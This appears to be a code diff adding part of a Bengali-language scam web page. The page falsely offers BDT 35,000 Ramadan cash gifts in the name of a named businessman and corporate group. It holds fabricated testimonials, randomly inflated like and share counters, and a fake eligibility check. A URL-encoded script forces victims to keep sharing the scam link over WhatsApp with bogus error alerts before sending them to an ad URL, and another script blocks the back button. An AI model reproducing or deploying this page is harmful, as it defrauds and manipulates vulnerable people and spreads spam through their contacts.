+    message: "আমি নিবন্ধন করেছি এবং বিডিটি ৩৫,০০০ পেয়েছি। এই সহায়তা আমাকে অনেক সাহায্য করেছে।",
+    timestamp: "২ মিনিট আগে",
+    hasImage: true,
+  
+},
+{
+    name: "নাজমুল ইসলাম",
+    initial: "S",
+    profilePic: "Sani.png",
+    message: "সত্যিই, আমি আশা করিনি এটা এত সহজ হবে। আমি আবেদন করেছি এবং কয়েক দিন পর বিডিটি ৩৫,০০০ পেয়েছি!",
+    timestamp: "৪ মিনিট আগে",
+    hasImage: false
+},
+{
+    name: "ফারহানা আক্তার",
+    initial: "Z",
+    profilePic: "Zainab.png",
+    message: "সহায়তাটি আমার সবচেয়ে প্রয়োজনের সময় এসেছে। আমি এটা আমার ব্যবসার জন্য পণ্য কিনতে ব্যবহার করেছি।",
+    timestamp: "৭ মিনিট আগে",
+    hasImage: true,
+    
+},
+{
+    name: "তানিয়া রহমান",
+    initial: "U",
+    profilePic: "us.png",
+    message: "আমি ₦১০,০০০ পেয়েছি। আমি এই টাকা দিয়ে আমার POS ব্যবসা শুরু করেছি।",
+    timestamp: "১০ মিনিট আগে",
+    hasImage: false
+},
+{
+    name: "জয়নুল আবেদীন",
+    initial: "M",
+    profilePic: "Maryam.png",
+    message: "আমি একজন ছাত্র এবং এই সহায়তা আমাকে হোস্টেল ফি পরিশোধ করতে এবং বই কিনতে সাহায্য করেছে।",
+    timestamp: "১২ মিনিট আগে",
+    hasImage: true,
+   
+},
+{
+    name: "রিফাত চৌধুরী",
+    initial: "K",
+    profilePic: "Sani.png",
+    message: " আমি সরাসরি আমার অ্যাকাউন্টে বিডিটি ৩৫,০০০ পেয়েছি।",
+    timestamp: "১৪ মিনিট আগে",
+    hasImage: false
+},
+{
+    name: "সাইফুল করিম",
+    initial: "H",
+    profilePic: "Hafsat.png",
+    message: "আমার বন্ধুরা আমাকে এই লিঙ্ক শেয়ার করেছে  আমিও বিডিটি ৩৫,০০০ পেয়েছি।",
+    timestamp: "১৬ মিনিট আগে",
+    hasImage: true,
+},
+{
+    name: "নুসরাত জাহান",
+    initial: "I",
+    profilePic: "Ibrahim.png",
+    message: "আমি বিডিটি ৩৫,০০০ পেয়েছি। আমি এটা আমার ঋণ পরিশোধ করতে ব্যবহার করেছি।",
+    timestamp: "১৮ মিনিট আগে",
+    hasImage: true,
+},
+{
+    name: "মাহমুদুল হাসান",
+    initial: "R",
+    profilePic: "Rukaiya.png",
+    message: "এটা একটা দারুণ সুযোগ। সময়সীমার আগে তাড়াতাড়ি আবেদন করুন।",
+    timestamp: "২০ মিনিট আগে",
+    hasImage: false
+},
+{
+    name: "সুমাইয়া বেগম",
+    initial: "M",
+    profilePic: "Musa.png",
+    message: "অনেক ধন্যবাদ। আমি এখন এখান থেকে বিডিটি ৩৫,০০০ পেয়েছি। এটা সত্যি, জাল নয়।",
+    timestamp: "২২ মিনিট আগে",
+    hasImage: false
+}
+];
+
+const testimonialsScroll = document.getElementById('testimonialsScroll');
+const newTestimonialInput = document.getElementById('newTestimonialInput');
+const sendBtn = document.getElementById('sendBtn');
+const imageUploadBtn = document.getElementById('imageUploadBtn');
+const imageInput = document.getElementById('imageInput');
+const imagePreview = document.getElementById('imagePreview');
+
+let selectedImage = null;
+
+// Create testimonial element
+function createTestimonialElement(testimonial) {
+    const testimonialEl = document.createElement('div');
+    testimonialEl.className = "testimonial";
+
+    let avatar = testimonial.profilePic
+        ? `<img src="${testimonial.profilePic}" style="width:24px;height:24px;border-radius:50%;margin-right:8px;object-fit:cover;">`
+        : `<div style="width:24px;height:24px;border-radius:50%;margin-right:8px;background:#e0e0e0;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:10px;">${testimonial.initial}</div>`;
+
+    let imageHtml = testimonial.hasImage && testimonial.imageUrl
+        ? `<img src="${testimonial.imageUrl}" style="max-width:80px;max-height:60px;border-radius:4px;margin-top:4px;">`
+        : '';
+
+    testimonialEl.innerHTML = `
+        ${avatar}
+        <div>
+            <div style="font-weight:500;">${testimonial.name} <span style="color:#777;font-size:10px;">${testimonial.timestamp}</span></div>
+            <div>${testimonial.message}</div>
+            ${imageHtml}
+        </div>
+    `;
+    return testimonialEl;
+}
+
+// Add testimonials
+function addTestimonials() {
+    sampleTestimonials.forEach(t => {
+        testimonialsScroll.appendChild(createTestimonialElement(t));
+    });
+
+    // Clone for smooth scroll
+    testimonialsScroll.innerHTML += testimonialsScroll.innerHTML;
+}
+
+addTestimonials();
+
+// Add new testimonial
+function addNewTestimonial() {
+    const message = newTestimonialInput.value.trim();
+    if (!message && !selectedImage) return;
+
+    const newTestimonial = {
+        name: "আপনি",
+        initial: "Y",
+        profilePic: null,
+        message: message,
+        timestamp: "এখন",
+        hasImage: selectedImage !== null,
+        imageUrl: selectedImage
+    };
+
+    testimonialsScroll.appendChild(createTestimonialElement(newTestimonial));
+    newTestimonialInput.value = '';
+    selectedImage = null;
+    imagePreview.style.display = "none";
+}
+
+sendBtn.addEventListener('click', addNewTestimonial);
+
+newTestimonialInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') addNewTestimonial();
+});
+
+imageUploadBtn.addEventListener('click', () => imageInput.click());
+
+imageInput.addEventListener('change', function(e) {
+    if (e.target.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+            selectedImage = event.target.result;
+            imagePreview.src = selectedImage;
+            imagePreview.style.display = "block";
+        };
+        reader.readAsDataURL(e.target.files[0]);
+    }
+});
+</script></center>
+<br/><br/>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script type="text/javascript">
+        var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "মিনিট");
+    $(".t2").html(time + 2 + "মিনিট");
+    $(".t3").html(time + 4 + "মিনিট");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K মন্তব্য");
+    $("#shares").html(shares + "K শেয়ার");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("লাইক");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("আনলাইক");
+    }
+});
+    </script>
+    <script type="text/javascript">
+        $("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+    </script>
+
+<script>
+    var text1 = "*আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ বিডিটি ৩৫,০০০ রমজান ক্যাশ উপহার*%0A %0A*রমজান হলো রোজা ও ভাগ করে নেওয়ার মাস। আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ প্রত্যেক নাইজেরিয়ানকে বিডিটি ৩৫,০০০ দিচ্ছে।*%0A%0A*_এখন কীভাবে পাবেন_*%0A_নিচের লিঙ্কে যান এবং আহমেদ আকবর সোবহান এবং বসুন্ধরা গ্রুপ থেকে তাৎক্ষণিকভাবে বিডিটি ৩৫,০০০ পাবেন।_%0A আমি এখনই আমারটা পেয়েছি%0A%0A_এখানে ক্লিক করুন_👇%0Ahttps://raa-daan-maa-help.site/Forall.html",
+            text2 = " এর পরিমাণ ",
+            text3 = "দরিদ্র শ্রেণির সংকট কাটিয়ে উঠতে সাহায্য হিসেবে শর্ত পূরণকারী প্রত্যেক নাগরিকের জন্য। এখনই প্রবেশ করুন এবং নিবন্ধন করুন এবং সঠিকভাবে নিবন্ধন করতে ভুলবেন না 👉 ",
+            error = "কিছু ভুল হয়েছে!\nপোস্ট গণনা করা হয়নি। আপনি হয়তো একই বন্ধু বা গ্রুপের সাথে একাধিকবার শেয়ার করেছেন, অনুগ্রহ করে আবার শেয়ার করুন",
+            abcde = "https://obqj2.com/4/1322937",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+</script>
+    
+    <script>
+        <!-- code by OD 
+        -->
+        document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+    </script>
+
+
+    <script>
+        (function (global) {
+
+    if(typeof (global) === "undefined")
+    {
+        throw new Error("window is undefined");
+    }
+
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+
+        // making sure we have the fruit available for juice....
+        // 50 milliseconds for just once do not cost much (^__^)
+        global.setTimeout(function () {
+            global.location.href += "!";
+        }, 50);
+    };
+    
+    // Earlier we had setInerval here....
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) {
+            global.location.hash = _hash;
+        }
+    };
+
+    global.onload = function () {
+        
+        noBackPlease();
+
+        // disables backspace on page except on input fields and textarea..
+        document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
+                e.preventDefault();
+            }
+            // stopping event bubbling up the DOM tree..
+            e.stopPropagation();
+        };
+        
+    };
+
+})(window);
+    </script>
+
+
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1731216,"","ffffff");</script><!-- END: Powered by Supercounters.com -->
+
+
+</body>
+
+</html>
